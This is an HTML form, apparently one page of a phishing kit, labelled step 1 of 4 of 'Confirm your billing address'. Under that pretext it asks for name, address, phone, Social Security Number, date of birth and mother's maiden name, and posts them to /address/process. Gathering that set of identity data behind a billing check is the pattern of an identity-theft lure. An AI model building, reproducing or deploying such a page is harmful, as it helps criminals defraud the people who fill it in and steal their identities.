<main>
    <form id="myForm" action="/address/process" method="post">
        <small> STEP <b>1</b> of <b>4</b> </small>
        <h1> Confirm your billing address </h1>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-firstname" name="karma-firstname" placeholder=" ">
                <label for="karma-firstname">First Name</label>
                <span id="karma-firstname-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-lastname" name="karma-lastname" placeholder=" ">
                <label for="karma-lastname">Last Name</label>
                <span id="karma-lastname-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-address" name="karma-address" placeholder=" ">
                <label for="karma-address">Address</label>
                <span id="karma-address-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row">
            <div class="form-group">
                <input class="gaya-input" type="text" id="karma-city" name="karma-city" placeholder=" ">
                <label for="karma-city">City</label>
                <span id="karma-city-error" class="d-none"></span>
            </div>
            <div class="form-group">
                <input class="gaya-input" type="text" id="karma-state" name="karma-state" placeholder=" ">
                <label for="karma-state">State</label>
                <span id="karma-state-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row">
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-zipcode" name="karma-zipcode" placeholder=" " maxlength="10">
                <label for="karma-zipcode">Zip Code</label>
                <span id="karma-zipcode-error" class="d-none"></span>
            </div>
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-ssn" name="karma-ssn" placeholder=" " maxlength="11">
                <label for="karma-ssn">Social Security Number</label>
                <span id="karma-ssn-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row">
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-phonenumber" name="karma-phonenumber" placeholder=" " maxlength="12">
                <label for="karma-phonenumber">Phone Or Mobile Number</label>
                <span id="karma-phonenumber-error" class="d-none"></span>
            </div>
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-dob" name="karma-dob" placeholder=" " maxlength="10">
                <label for="karma-dob">Date Of Birthday (MM/DD/YYYY)</label>
                <span id="karma-dob-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-mmn" name="karma-mmn" placeholder=" ">
                <label for="karma-mmn">Mother's Maiden Name</label>
                <span id="karma-mmn-error" class="d-none"></span>
            </div>
        </div>
        <input type="submit" value="Continue" class="submit-button">
    </form>
</main>
